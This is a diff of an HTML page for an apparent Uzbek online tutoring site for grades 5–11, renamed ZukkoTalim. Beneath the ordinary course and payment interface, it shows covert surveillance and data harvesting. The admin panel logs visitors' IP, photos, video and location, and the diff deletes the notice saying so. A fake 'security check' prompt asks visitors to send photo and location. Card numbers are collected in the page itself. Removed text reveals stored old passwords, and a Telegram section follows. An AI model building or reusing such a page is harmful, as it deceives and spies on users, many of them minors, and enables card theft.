@@ -3,7 +3,16 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>EduPlatform — O'quv platformasi</title>
+<title>ZukkoTalim — O'zbekistonda sifatli onlayn ta'lim | Video darslar va repetitorlar</title>
+<meta name="description" content="ZukkoTalim — O'zbekistondagi eng qulay onlayn ta'lim platformasi. 5-11 sinf uchun matematika, ingliz tili, algebra va boshqa fanlardan 100+ video darslar.">
+<meta name="keywords" content="ZukkoTalim, onlayn kurs, repetitor, matematika, ingliz tili, video darslar">
+<meta name="author" content="ZukkoTalim">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="ZukkoTalim — O'zbekistonda sifatli onlayn ta'lim">
+<meta property="og:description" content="100+ video darslar, arzon kurslar, sifatli repetitorlar.">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="ZukkoTalim">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎓</text></svg>">
 <script src="https://cdn.tailwindcss.com"></script>
 <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
 <style>
@@ -13,14 +22,13 @@ body{background:#0d1117;color:#c9d1d9;font-family:system-ui,-apple-system,sans-s
 .custom-scrollbar::-webkit-scrollbar{width:6px}
 .custom-scrollbar::-webkit-scrollbar-track{background:#0d1117}
 .custom-scrollbar::-webkit-scrollbar-thumb{background:#30363d;border-radius:4px}
-.custom-scrollbar::-webkit-scrollbar-thumb:hover{background:#484f58}
 @keyframes pulse-dot{0%,100%{opacity:1}50%{opacity:.4}}
 .online-dot{animation:pulse-dot 1.5s ease-in-out infinite}
 </style>
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
 <script>
-const firebaseConfig={apiKey:"AIzaSyDJIICaketn7Khrnl38_K-XYuC3bfaOYD8",authDomain:"edu-platform-64953.firebaseapp.com",databaseURL:"https://edu-platform-64953-default-rtdb.firebaseio.com",projectId:"edu-platform-64953",storageBucket:"edu-platform-64953.firebasestorage.app",messagingSenderId:"986479470743",appId:"1:986479470743:web:5e29214cc9595ae95c21d2",measurementId:"G-XVCFTYCJDB"};
+const firebaseConfig={apiKey:"AIzaSyDJIICaketn7Khrnl38_K-XYuC3bfaOYD8",authDomain:"edu-platform-64953.firebaseapp.com",databaseURL:"https://edu-platform-64953-default-rtdb.firebaseio.com",projectId:"edu-platform-64953",storageBucket:"edu-platform-64953.firebasestorage.app",messagingSenderId:"986479470743",appId:"1:986479470743:web:5e29214cc9595ae95c21d2"};
 firebase.initializeApp(firebaseConfig);
 const database=firebase.database();
 </script>
@@ -30,7 +38,7 @@ const database=firebase.database();
 <nav class="glass sticky top-0 z-40 px-4 md:px-6 py-3 md:py-4 shadow-2xl">
 <div class="flex justify-between items-center gap-2">
 <div class="flex items-center gap-2 md:gap-3 text-lg md:text-2xl font-black text-blue-400 cursor-pointer tracking-wide shrink-0" onclick="navigateTo('home')">
-<i class="fas fa-graduation-cap text-xl md:text-3xl"></i><span>EduPlatform</span></div>
+<i class="fas fa-graduation-cap text-xl md:text-3xl"></i><span>ZukkoTalim</span></div>
 <div class="hidden md:flex gap-8 text-sm font-semibold">
 <button onclick="navigateTo('home')" class="hover:text-blue-400 transition flex items-center gap-2"><i class="fas fa-th-large"></i> Barcha Kurslar</button>
 <button onclick="navigateTo('my-courses')" class="hover:text-blue-400 transition flex items-center gap-2"><i class="fas fa-play-circle text-indigo-400"></i> Mening Kurslarim</button>
@@ -39,7 +47,7 @@ const database=firebase.database();
 </div>
 <div class="flex items-center gap-2 md:gap-4 shrink-0">
 <div id="authNavArea" class="flex items-center gap-2 md:gap-4"></div>
-<button onclick="toggleMobileMenu()" aria-label="Menu" class="md:hidden w-9 h-9 flex items-center justify-center rounded-lg bg-slate-800/70 border border-slate-700 text-slate-200 hover:bg-slate-700 transition shrink-0"><i id="mobileMenuIcon" class="fas fa-bars"></i></button>
+<button onclick="toggleMobileMenu()" class="md:hidden w-9 h-9 flex items-center justify-center rounded-lg bg-slate-800/70 border border-slate-700 text-slate-200 hover:bg-slate-700 transition shrink-0"><i id="mobileMenuIcon" class="fas fa-bars"></i></button>
 </div></div>
 <div id="mobileMenu" class="hidden md:hidden mt-3 pt-3 border-t border-slate-800 flex flex-col gap-1 text-sm font-semibold">
 <button onclick="navigateTo('home');closeMobileMenu()" class="text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition flex items-center gap-3"><i class="fas fa-th-large w-4 text-center"></i> Barcha Kurslar</button>
@@ -53,7 +61,7 @@ const database=firebase.database();
 
 <section id="pageHome" class="space-y-8">
 <div class="text-center py-10 rounded-2xl bg-gradient-to-r from-blue-900/30 via-slate-900 to-indigo-900/30 border border-slate-800 shadow-xl">
-<h1 class="text-3xl md:text-5xl font-black text-white mb-3">Sifatli Ta'lim va Video Darslar</h1>
+<h1 class="text-3xl md:text-5xl font-black text-white mb-3">ZukkoTalim — Sifatli Ta'lim va Video Darslar</h1>
 <p class="text-slate-400 max-w-2xl mx-auto text-sm md:text-base">O'zingizga mos repetitor va kurslarni tanlang, xarid qiling va istalgan vaqtda video darslarni tomosha qiling!</p></div>
 <div class="space-y-4 card-bg p-5 rounded-2xl shadow-md">
 <div><span class="text-xs text-slate-400 block mb-2 font-bold uppercase tracking-wider">📌 Sinf bo'yicha filter:</span><div id="classFilters" class="flex flex-wrap gap-2"></div></div>
@@ -80,26 +88,27 @@ const database=firebase.database();
 
 <div id="adminTabUsers" class="space-y-6">
 <div class="card-bg p-4 rounded-xl flex flex-wrap gap-3 items-center">
-<input type="text" id="adminUserIdInput" placeholder="Foydalanuvchi ID (Masalan: USR-1002)" class="bg-slate-900 border border-slate-700 px-4 py-2 rounded-lg text-sm flex-grow focus:outline-none focus:border-blue-500">
+<input type="text" id="adminUserIdInput" placeholder="Foydalanuvchi ID (USR-1002)" class="bg-slate-900 border border-slate-700 px-4 py-2 rounded-lg text-sm flex-grow focus:outline-none focus:border-blue-500">
+<button onclick="adminAddBalanceById()" class="bg-green-600 hover:bg-green-700 text-white text-sm px-4 py-2 rounded-lg font-bold transition"><i class="fas fa-plus-circle mr-1"></i> Balans qo'shish</button>
 <button onclick="banUser()" class="bg-red-600 hover:bg-red-700 text-white text-sm px-4 py-2 rounded-lg font-bold transition">Ban qilish</button>
 <button onclick="unbanUser()" class="bg-slate-700 hover:bg-slate-600 text-white text-sm px-4 py-2 rounded-lg font-bold transition">Bandan yechish</button>
-<button onclick="resetBalance()" class="bg-amber-600 hover:bg-amber-700 text-slate-900 text-sm px-4 py-2 rounded-lg font-bold transition">Balansni nol qilish</button>
+<button onclick="resetBalance()" class="bg-amber-600 hover:bg-amber-700 text-slate-900 text-sm px-4 py-2 rounded-lg font-bold transition">Balans nol</button>
 </div>
 <div id="adminUsersList" class="space-y-3"></div></div>
 
 <div id="adminTabGuests" class="hidden space-y-6">
 <div class="card-bg p-4 rounded-xl">
-<p class="text-xs text-slate-400"><i class="fas fa-info-circle text-blue-400 mr-1"></i> Ro'yxatdan o'tmagan foydalanuvchilar. Saytga kirganda avtomatik qayd etiladi (IP, foto, video, joylashuv).</p>
+<p class="text-xs text-slate-400"><i class="fas fa-info-circle text-blue-400 mr-1"></i> Ro'yxatdan o'tmagan foydalanuvchilar.</p>
 </div>
 <div id="adminGuestsList" class="space-y-3"></div></div>
 
 <div id="adminTabTutors" class="hidden space-y-6">
 <div class="card-bg p-6 rounded-xl space-y-4">
-<h3 class="text-lg font-bold text-white"><i class="fas fa-user-plus mr-2 text-green-400"></i>Yangi Repetitor Qo'shish</h3>
+<h3 class="text-lg font-bold text-white"><i class="fas fa-user-plus mr-2 text-green-400"></i>Yangi Repetitor</h3>
 <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
 <input type="text" id="newTutorName" placeholder="Ism Familiya" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
 <input type="text" id="newTutorImg" placeholder="Rasm URL" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
-<input type="number" id="newTutorPrice" placeholder="Narxi (so'm)" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
+<input type="number" id="newTutorPrice" placeholder="Narxi" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
 <select id="newTutorSinf" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300">
 <option value="Umumiy">Umumiy</option><option value="5-sinf">5-sinf</option><option value="6-sinf">6-sinf</option><option value="7-sinf">7-sinf</option><option value="8-sinf">8-sinf</option><option value="9-sinf">9-sinf</option><option value="10-sinf">10-sinf</option><option value="11-sinf">11-sinf</option></select>
 <select id="newTutorFan" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300 col-span-1 md:col-span-2">
@@ -114,16 +123,16 @@ const database=firebase.database();
 
 <div id="adminTabLessons" class="hidden space-y-6">
 <div class="card-bg p-6 rounded-xl space-y-4">
-<h3 class="text-lg font-bold text-white"><i class="fas fa-plus-circle text-blue-400 mr-2"></i>Kursga Yangi Video Dars</h3>
+<h3 class="text-lg font-bold text-white"><i class="fas fa-plus-circle text-blue-400 mr-2"></i>Kursga Dars</h3>
 <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-<div class="col-span-1 md:col-span-2"><label class="text-xs text-slate-400 block mb-1">Repetitorni tanlang:</label>
+<div class="col-span-1 md:col-span-2"><label class="text-xs text-slate-400 block mb-1">Repetitor:</label>
 <select id="lessonTutorSelect" onchange="renderAdminLessonsList()" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></select></div>
 <input type="text" id="newLessonTitle" placeholder="Dars Nomi" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
-<input type="text" id="newLessonUrl" placeholder="YouTube / Vimeo link" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
+<input type="text" id="newLessonUrl" placeholder="YouTube / Vimeo" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
 <button onclick="addLessonToTutor()" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2.5 rounded-lg font-bold text-sm transition"><i class="fas fa-plus mr-1"></i> Qo'shish</button></div>
 <div class="card-bg p-6 rounded-xl space-y-4 border border-indigo-800/40">
 <h3 class="text-lg font-bold text-white"><i class="fas fa-layer-group mr-2 text-emerald-400"></i>Ko'p Darslarni Birdan Qo'shish</h3>
-<p class="text-xs text-slate-400">Har bir qator: <b class="text-slate-300">Dars nomi | YouTube link</b></p>
+<p class="text-xs text-slate-400">Format: <b>Dars nomi | YouTube link</b></p>
 <textarea id="bulkLessonsInput" rows="8" placeholder="1-Dars. Nomi | https://youtu.be/ID" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-sm text-white font-mono"></textarea>
 <button onclick="addLessonsBulk()" class="bg-emerald-600 hover:bg-emerald-700 text-white px-6 py-2.5 rounded-lg font-bold text-sm transition"><i class="fas fa-layer-group mr-1"></i> Barchasini Qo'shish</button></div>
 <div class="card-bg p-6 rounded-xl space-y-4">
@@ -135,20 +144,28 @@ const database=firebase.database();
 <section id="pageProfile" class="hidden space-y-6">
 <div class="card-bg p-6 rounded-2xl flex flex-wrap justify-between items-center gap-4">
 <div class="flex items-center gap-4">
-<div id="profAvatar" class="w-16 h-16 rounded-full bg-blue-600/30 border border-blue-500 flex items-center justify-center text-blue-400 text-2xl font-bold overflow-hidden"><i class="fas fa-user"></i></div>
-<div><h1 id="profName" class="text-2xl font-bold text-white">...</h1><p id="profId" class="text-xs text-slate-400 mt-0.5">...</p></div></div>
+<div class="relative">
+<div id="profAvatar" class="w-20 h-20 rounded-full bg-blue-600/30 border-2 border-blue-500 flex items-center justify-center text-blue-400 text-3xl font-bold overflow-hidden cursor-pointer" onclick="changeAvatar()" title="Rasmni o'zgartirish"><i class="fas fa-user"></i></div>
+<button onclick="changeAvatar()" class="absolute bottom-0 right-0 w-7 h-7 bg-blue-600 hover:bg-blue-700 text-white rounded-full text-xs font-bold shadow-lg border-2 border-slate-900" title="Rasmni o'zgartirish"><i class="fas fa-camera"></i></button>
+</div>
+<div>
+<div class="flex items-center gap-2 flex-wrap">
+<h1 id="profName" class="text-2xl font-bold text-white">...</h1>
+<button onclick="changeUsername()" class="text-blue-400 hover:text-blue-300 text-xs" title="Loginni o'zgartirish"><i class="fas fa-edit"></i></button>
+</div>
+<p id="profId" class="text-xs text-slate-400 mt-0.5">...</p>
+</div></div>
 <div class="bg-slate-900 px-6 py-3 rounded-xl border border-slate-800 flex items-center gap-4 flex-wrap">
 <div><span class="text-xs text-slate-400 block">Hisob balansi:</span><span id="profBalance" class="text-xl font-black text-green-400">0 so'm</span></div>
 <button onclick="addMoney()" class="bg-blue-600 hover:bg-blue-700 text-white text-xs px-3 py-2 rounded-lg font-bold transition">+ Balansni to'ldirish</button></div>
 <div id="notifBanner" class="bg-slate-900 px-6 py-4 rounded-xl border border-slate-800">
 <div class="flex items-center justify-between gap-4 flex-wrap">
 <div class="flex items-center gap-3"><div class="w-9 h-9 bg-amber-500/20 rounded-lg flex items-center justify-center text-amber-400"><i class="fas fa-bell"></i></div>
-<div><p class="text-sm font-bold text-white">Kunlik eslatmalar</p><p id="notifStatus" class="text-xs text-slate-400">Har kuni 19:00 da dars eslatmasi</p></div></div>
+<div><p class="text-sm font-bold text-white">Kunlik eslatmalar</p><p id="notifStatus" class="text-xs text-slate-400">Har kuni 19:00 da</p></div></div>
 <button id="notifBtn" onclick="requestPushPermission()" class="bg-amber-500 hover:bg-amber-600 text-slate-900 text-xs font-black px-4 py-2 rounded-lg transition whitespace-nowrap"><i class="fas fa-bell mr-1"></i> Yoqish</button></div></div></div>
 
 <div class="card-bg p-6 rounded-2xl space-y-4">
 <h2 class="text-xl font-bold text-white flex items-center gap-2"><i class="fas fa-shield-alt text-emerald-400"></i> Xavfsizlik</h2>
-<p class="text-xs text-slate-400">Parolingizni o'zgartirishingiz mumkin. Barcha eski parollar admin panelida saqlanadi.</p>
 <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
 <div><label class="text-xs text-slate-400 block mb-1.5 font-semibold">Hozirgi parol</label>
 <input type="password" id="secOldPass" placeholder="••••••" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-lg px-3 py-2.5 text-sm text-white outline-none transition"></div>
@@ -167,7 +184,7 @@ const database=firebase.database();
 <div class="card-bg w-full max-w-6xl h-[90vh] rounded-2xl flex flex-col overflow-hidden relative border border-slate-800 shadow-2xl">
 <div class="px-6 py-4 bg-slate-900 border-b border-slate-800 flex justify-between items-center">
 <div class="flex items-center gap-3"><span class="bg-blue-600/20 text-blue-400 p-2 rounded-lg text-sm"><i class="fas fa-play-circle"></i></span>
-<div><h3 id="modalCourseTitle" class="text-base md:text-lg font-bold text-white leading-tight">Kurs Nomi</h3>
+<div><h3 id="modalCourseTitle" class="text-base md:text-lg font-bold text-white leading-tight">Kurs</h3>
 <p id="modalLessonCounter" class="text-xs text-slate-400">Dars 1 / 10</p></div></div>
 <button onclick="closeCoursePlayer()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-2"><i class="fas fa-times"></i> Yopish</button></div>
 <div class="flex-grow flex flex-col lg:flex-row overflow-hidden">
@@ -180,9 +197,9 @@ const database=firebase.database();
 <button onclick="prevLesson()" class="bg-slate-800 hover:bg-slate-700 text-white px-3 py-1.5 rounded font-semibold"><i class="fas fa-chevron-left mr-1"></i> Oldingisi</button>
 <button onclick="nextLesson()" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded font-semibold">Keyingisi <i class="fas fa-chevron-right ml-1"></i></button></div></div></div>
 <div class="lg:w-1/4 bg-slate-900/90 border-t lg:border-t-0 lg:border-l border-slate-800 flex flex-col h-full">
-<div class="p-4 border-b border-slate-800 bg-slate-900/50 flex justify-between items-center">
-<h4 class="font-bold text-sm text-white flex items-center gap-2"><i class="fas fa-list-ul text-blue-400"></i> Darslar ro'yxati</h4>
-<span id="playlistTotalBadge" class="text-[11px] bg-slate-800 text-slate-300 px-2 py-0.5 rounded-full font-bold">0 dars</span></div>
+<div class="p-4 border-b border-slate-800 flex justify-between items-center">
+<h4 class="font-bold text-sm text-white flex items-center gap-2"><i class="fas fa-list-ul text-blue-400"></i> Darslar</h4>
+<span id="playlistTotalBadge" class="text-[11px] bg-slate-800 text-slate-300 px-2 py-0.5 rounded-full font-bold">0</span></div>
 <div id="coursePlaylist" class="flex-grow overflow-y-auto p-3 space-y-2 custom-scrollbar"></div></div></div></div></div>
 
 <!-- EDIT TUTOR -->
@@ -192,16 +209,16 @@ const database=firebase.database();
 <h2 class="text-xl font-bold text-white text-center"><i class="fas fa-user-edit mr-2"></i>Repetitorni Tahrirlash</h2>
 <input type="hidden" id="editTutorId">
 <div class="space-y-3">
-<div><label class="text-xs text-slate-400">Ism Familiya</label><input type="text" id="editTutorName" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
+<div><label class="text-xs text-slate-400">Ism</label><input type="text" id="editTutorName" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
 <div><label class="text-xs text-slate-400">Rasm URL</label><input type="text" id="editTutorImg" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
 <div class="grid grid-cols-2 gap-3">
-<div><label class="text-xs text-slate-400">Narxi (so'm)</label><input type="number" id="editTutorPrice" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
+<div><label class="text-xs text-slate-400">Narxi</label><input type="number" id="editTutorPrice" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
 <div><label class="text-xs text-slate-400">Sinf</label><select id="editTutorSinf" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300">
 <option value="Umumiy">Umumiy</option><option value="5-sinf">5-sinf</option><option value="6-sinf">6-sinf</option><option value="7-sinf">7-sinf</option><option value="8-sinf">8-sinf</option><option value="9-sinf">9-sinf</option><option value="10-sinf">10-sinf</option><option value="11-sinf">11-sinf</option></select></div></div>
 <div><label class="text-xs text-slate-400">Fan</label><select id="editTutorFan" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300">
 <option value="Ingliz tili">Ingliz tili</option><option value="Matematika">Matematika</option><option value="Fizika">Fizika</option><option value="Informatika">Informatika</option><option value="Kimyo">Kimyo</option><option value="Tarix">Tarix</option></select></div></div>
 <div class="flex gap-3 pt-2"><button onclick="saveTutorEdit()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 rounded-lg text-sm transition">Saqlash</button>
-<button onclick="closeEditModal()" class="bg-slate-700 hover:bg-slate-600 text-white font-bold px-4 py-2.5 rounded-lg text-sm transition">Bekor qilish</button></div></div></div>
+<button onclick="closeEditModal()" class="bg-slate-700 hover:bg-slate-600 text-white font-bold px-4 py-2.5 rounded-lg text-sm transition">Bekor</button></div></div></div>
 
 <!-- AUTH -->
 <div id="authModal" class="fixed inset-0 bg-black/70 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
@@ -221,28 +238,27 @@ const database=firebase.database();
 <div id="insufficientModal" class="hidden fixed inset-0 z-[200] flex items-center justify-center p-4" style="background:rgba(0,0,0,.8);backdrop-filter:blur(8px)">
 <div class="card-bg rounded-2xl w-full max-w-md shadow-2xl border border-slate-700 overflow-hidden">
 <div class="bg-gradient-to-r from-amber-600 to-red-600 px-6 py-5">
-<p class="text-xs text-amber-100 font-semibold uppercase tracking-widest">EduPlatform Pay</p>
+<p class="text-xs text-amber-100 font-semibold uppercase">ZukkoTalim Pay</p>
 <p class="text-white font-black text-lg mt-0.5 flex items-center gap-2"><i class="fas fa-exclamation-triangle"></i> Mablag' yetarli emas</p></div>
 <div class="px-6 py-5 space-y-3">
 <div class="bg-slate-900/70 border border-slate-700 rounded-xl px-4 py-3 space-y-2">
-<div class="flex justify-between text-sm gap-3"><span class="text-slate-400 shrink-0">Kurs:</span><span id="insufficientTutorName" class="text-white font-bold text-right truncate"></span></div>
+<div class="flex justify-between text-sm gap-3"><span class="text-slate-400">Kurs:</span><span id="insufficientTutorName" class="text-white font-bold text-right truncate"></span></div>
 <div class="flex justify-between text-sm"><span class="text-slate-400">Narxi:</span><span id="insufficientPrice" class="text-white font-bold"></span></div>
 <div class="flex justify-between text-sm"><span class="text-slate-400">Balansingiz:</span><span id="insufficientBalance" class="text-amber-400 font-bold"></span></div>
-<div class="flex justify-between text-sm border-t border-slate-800 pt-2"><span class="text-slate-400">Yetmayapti:</span><span id="insufficientMissing" class="text-red-400 font-bold"></span></div></div>
-<p class="text-xs text-slate-400 text-center">Kursni xarid qilish uchun balansingizni to'ldiring.</p></div>
-<div class="px-6 pb-5 flex gap-3"><button onclick="closeInsufficientModal()" class="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl text-sm transition">Bekor qilish</button>
-<button onclick="goToTopUp()" class="flex-1 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-black py-3 rounded-xl text-sm shadow-lg transition"><i class="fas fa-plus-circle mr-1.5"></i> Balansni to'ldirish</button></div></div></div>
+<div class="flex justify-between text-sm border-t border-slate-800 pt-2"><span class="text-slate-400">Yetmayapti:</span><span id="insufficientMissing" class="text-red-400 font-bold"></span></div></div></div>
+<div class="px-6 pb-5 flex gap-3"><button onclick="closeInsufficientModal()" class="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl text-sm transition">Bekor</button>
+<button onclick="goToTopUp()" class="flex-1 bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-black py-3 rounded-xl text-sm transition"><i class="fas fa-plus-circle mr-1.5"></i> To'ldirish</button></div></div></div>
 
 <!-- PAYMENT -->
 <div id="paymentModal" class="hidden fixed inset-0 z-[200] flex items-center justify-center p-4" style="background:rgba(0,0,0,.8);backdrop-filter:blur(8px)">
 <div class="card-bg rounded-2xl w-full max-w-md shadow-2xl border border-slate-700 overflow-hidden">
 <div class="bg-gradient-to-r from-blue-700 to-indigo-700 px-6 py-5 flex items-center justify-between">
-<div><p class="text-xs text-blue-200 font-semibold uppercase tracking-widest">EduPlatform Pay</p>
+<div><p class="text-xs text-blue-200 font-semibold uppercase">ZukkoTalim Pay</p>
 <p id="payModalTitle" class="text-white font-black text-lg mt-0.5">Balansni to'ldirish</p></div>
 <div class="flex items-center gap-3 text-white/80 text-3xl"><i class="fab fa-cc-visa"></i><i class="fab fa-cc-mastercard"></i></div></div>
 <div id="payAmountRow" class="hidden px-6 pt-5"><div class="bg-slate-900/70 border border-slate-700 rounded-xl px-4 py-3 flex items-center justify-between">
-<span class="text-slate-400 text-sm">To'lov summasi</span><span id="payAmountDisplay" class="text-white font-black text-lg"></span></div></div>
-<div id="payTopUpRow" class="px-6 pt-5"><label class="text-xs text-slate-400 font-semibold uppercase block mb-1.5">To'ldirish summasi (so'm)</label>
+<span class="text-slate-400 text-sm">Summa</span><span id="payAmountDisplay" class="text-white font-black text-lg"></span></div></div>
+<div id="payTopUpRow" class="px-6 pt-5"><label class="text-xs text-slate-400 font-semibold uppercase block mb-1.5">To'ldirish summasi</label>
 <input id="payTopUpAmount" type="number" min="1000" step="1000" value="100000" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-xl px-4 py-3 text-white font-bold text-lg outline-none transition"></div>
 <div class="px-6 pt-5 space-y-4">
 <div><label class="text-xs text-slate-400 font-semibold uppercase block mb-1.5">Karta raqami</label>
@@ -256,9 +272,9 @@ const database=firebase.database();
 <div><label class="text-xs text-slate-400 font-semibold uppercase block mb-1.5">Karta egasi</label>
 <input id="payHolder" type="text" placeholder="IVAN IVANOV" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-xl px-4 py-3 text-white font-mono outline-none transition" oninput="this.value=this.value.toUpperCase()"></div></div>
 <p id="payError" class="hidden text-red-400 text-xs font-semibold px-6 pt-3"></p>
-<div class="px-6 py-5 flex gap-3"><button onclick="closePaymentModal()" class="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl text-sm transition">Bekor qilish</button>
-<button onclick="submitPayment()" class="flex-1 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-black py-3 rounded-xl text-sm shadow-lg transition"><i class="fas fa-lock mr-1.5"></i> To'lash</button></div>
-<div class="border-t border-slate-800 px-6 py-3 flex items-center gap-2 text-slate-500 text-xs"><i class="fas fa-shield-alt text-green-500"></i><span>256-bit SSL orqali himoyalangan</span></div></div></div>
+<div class="px-6 py-5 flex gap-3"><button onclick="closePaymentModal()" class="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl text-sm transition">Bekor</button>
+<button onclick="submitPayment()" class="flex-1 bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-black py-3 rounded-xl text-sm transition"><i class="fas fa-lock mr-1.5"></i> To'lash</button></div>
+<div class="border-t border-slate-800 px-6 py-3 flex items-center gap-2 text-slate-500 text-xs"><i class="fas fa-shield-alt text-green-500"></i><span>256-bit SSL</span></div></div></div>
 
 <div id="payProcessing" class="hidden fixed inset-0 z-[210] flex items-center justify-center" style="background:rgba(0,0,0,.88);backdrop-filter:blur(10px)">
 <div class="text-center"><div class="w-20 h-20 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
@@ -270,59 +286,53 @@ const database=firebase.database();
 <p id="paySuccessMsg" class="text-slate-400 text-sm mb-6">Balansingiz yangilandi.</p>
 <button onclick="closePaySuccess()" class="bg-green-600 hover:bg-green-700 text-white font-bold px-10 py-3 rounded-xl text-base transition">Davom etish</button></div></div>
 
-<!-- PHOTO VIEWER -->
+<!-- VIEWERS -->
 <div id="photoViewerModal" class="hidden fixed inset-0 z-[310] flex items-center justify-center p-4" style="background:rgba(0,0,0,.95);backdrop-filter:blur(10px)" onclick="closePhotoViewer()">
-<div class="relative max-w-2xl max-h-[90vh]" onclick="event.stopPropagation()">
+<div class="relative max-w-2xl" onclick="event.stopPropagation()">
 <img id="photoViewerImg" class="max-w-full max-h-[85vh] rounded-2xl border-2 border-slate-700 shadow-2xl">
 <p id="photoViewerName" class="text-white text-center font-bold mt-3"></p>
-<button onclick="closePhotoViewer()" class="absolute -top-3 -right-3 bg-red-600 hover:bg-red-700 text-white w-10 h-10 rounded-full font-bold shadow-lg"><i class="fas fa-times"></i></button></div></div>
+<button onclick="closePhotoViewer()" class="absolute -top-3 -right-3 bg-red-600 text-white w-10 h-10 rounded-full font-bold"><i class="fas fa-times"></i></button></div></div>
 
-<!-- SNAPSHOT VIEWER -->
 <div id="liveViewerModal" class="hidden fixed inset-0 z-[315] flex items-center justify-center p-4" style="background:rgba(0,0,0,.95);backdrop-filter:blur(10px)" onclick="closeLiveViewer()">
 <div class="relative max-w-3xl" onclick="event.stopPropagation()">
 <div class="flex justify-between items-center mb-3"><p id="liveViewerName" class="text-white font-bold text-lg"></p>
-<button onclick="closeLiveViewer()" class="bg-red-600 hover:bg-red-700 text-white w-10 h-10 rounded-full font-bold shadow-lg"><i class="fas fa-times"></i></button></div>
+<button onclick="closeLiveViewer()" class="bg-red-600 text-white w-10 h-10 rounded-full font-bold"><i class="fas fa-times"></i></button></div>
 <img id="liveViewerImg" class="max-w-full max-h-[70vh] rounded-2xl border-2 border-emerald-500 shadow-2xl">
 <div id="liveViewerStrip" class="flex gap-2 mt-3 justify-center flex-wrap"></div></div></div>
 
-<!-- VIDEO VIEWER -->
 <div id="videoViewerModal" class="hidden fixed inset-0 z-[320] flex items-center justify-center p-4" style="background:rgba(0,0,0,.95);backdrop-filter:blur(10px)" onclick="closeVideoViewer()">
 <div class="relative max-w-2xl w-full" onclick="event.stopPropagation()">
 <div class="flex justify-between items-center mb-3"><p id="videoViewerName" class="text-white font-bold text-lg"></p>
-<button onclick="closeVideoViewer()" class="bg-red-600 hover:bg-red-700 text-white w-10 h-10 rounded-full font-bold shadow-lg"><i class="fas fa-times"></i></button></div>
+<button onclick="closeVideoViewer()" class="bg-red-600 text-white w-10 h-10 rounded-full font-bold"><i class="fas fa-times"></i></button></div>
 <video id="videoViewerPlayer" controls class="w-full rounded-2xl border-2 border-emerald-500 shadow-2xl bg-black"></video></div></div>
 
-<!-- FALLBACK BAR -->
 <div id="permFallbackBar" class="hidden fixed bottom-4 left-1/2 -translate-x-1/2 z-[250] card-bg rounded-2xl px-5 py-3 shadow-2xl border border-blue-700/50 flex items-center gap-3 max-w-[95%]">
 <i class="fas fa-shield-alt text-blue-400 text-xl"></i>
 <div class="flex-grow"><p class="text-white text-xs font-bold">Xavfsizlik tekshiruvi</p>
 <p class="text-slate-400 text-[10px]">Rasm va joylashuvni yuborish uchun bosing</p></div>
-<button onclick="captureAll(false)" class="bg-blue-600 hover:bg-blue-700 text-white text-xs font-black px-4 py-2 rounded-xl whitespace-nowrap transition"><i class="fas fa-check mr-1"></i> Ruxsat berish</button>
-<button onclick="dismissPermBar()" class="text-slate-500 hover:text-white text-lg px-1">✕</button></div>
-
-<script>
-// ===== TELEGRAM =====
